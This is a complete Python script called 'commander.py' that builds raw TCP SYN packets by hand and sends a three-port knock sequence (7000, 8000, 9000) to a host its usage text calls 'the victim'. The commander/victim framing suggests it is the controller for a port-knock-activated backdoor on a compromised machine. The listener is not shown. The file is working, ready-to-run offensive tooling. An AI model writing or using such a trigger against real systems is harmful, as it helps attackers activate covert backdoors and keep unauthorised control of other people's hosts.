#!/usr/bin/env python3
"""Commander: send the port-knock sequence to the victim.

Usage:
    sudo python3 commander.py <victim_ip>
"""

import socket
import struct
import sys
import time

KNOCK_PORTS = (7000, 8000, 9000)
KNOCK_DELAY_SECONDS = 0.1
SOURCE_PORT = 54321
TTL = 64


def detect_source_ip(destination_ip: str) -> str:
    probe_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe_socket.connect((destination_ip, 1))
        return probe_socket.getsockname()[0]
    finally:
        probe_socket.close()


def compute_checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    running_total = 0
    for byte_pair_start in range(0, len(data), 2):
        word = (data[byte_pair_start] << 8) + data[byte_pair_start + 1]
        running_total += word
        running_total = (running_total & 0xFFFF) + (running_total >> 16)
    return ~running_total & 0xFFFF


def build_ip_header(source_ip: str, destination_ip: str, total_length: int) -> bytes:
    def header_with_checksum(checksum_value: int) -> bytes:
        return struct.pack(
            "!BBHHHBBH4s4s",
            0x45,                     # version 4, header length 5 (20 bytes)
            0,                        # type of service
            total_length,
            0,                        # identification
            0,                        # flags + fragment offset
            TTL,
            socket.IPPROTO_TCP,
            checksum_value,
            socket.inet_aton(source_ip),
            socket.inet_aton(destination_ip),
        )
    correct_checksum = compute_checksum(header_with_checksum(0))
    return header_with_checksum(correct_checksum)


def build_tcp_syn_header(
    source_ip: str, destination_ip: str, destination_port: int
) -> bytes:
    def header_with_checksum(checksum_value: int) -> bytes:
        return struct.pack(
            "!HHLLBBHHH",
            SOURCE_PORT,
            destination_port,
            0,                        # sequence number
            0,                        # ack number
            0x50,                     # data offset 5 (20 bytes), reserved 0
            0x02,                     # flags: SYN only
            65535,                    # window
            checksum_value,
            0,                        # urgent pointer
        )
    pseudo_header = struct.pack(
        "!4s4sBBH",
        socket.inet_aton(source_ip),
        socket.inet_aton(destination_ip),
        0,
        socket.IPPROTO_TCP,
        20,                           # TCP header length
    )
    correct_checksum = compute_checksum(pseudo_header + header_with_checksum(0))
    return header_with_checksum(correct_checksum)


def send_single_knock(
    raw_socket: socket.socket,
    source_ip: str,
    destination_ip: str,
    destination_port: int,
) -> None:
    tcp_header = build_tcp_syn_header(source_ip, destination_ip, destination_port)
    ip_header = build_ip_header(source_ip, destination_ip, 20 + len(tcp_header))
    raw_socket.sendto(ip_header + tcp_header, (destination_ip, destination_port))


def main() -> int:
    if len(sys.argv) != 2:
        print("Usage: sudo python3 commander.py <victim_ip>", file=sys.stderr)
        return 2

    destination_ip = sys.argv[1]
    source_ip = detect_source_ip(destination_ip)

    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    print(f"knocking {destination_ip} from {source_ip}")
    try:
        for knock_index, destination_port in enumerate(KNOCK_PORTS):
            if knock_index > 0:
                time.sleep(KNOCK_DELAY_SECONDS)
            send_single_knock(raw_socket, source_ip, destination_ip, destination_port)
            print(f"  SYN -> {destination_ip}:{destination_port}")
    finally:
        raw_socket.close()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
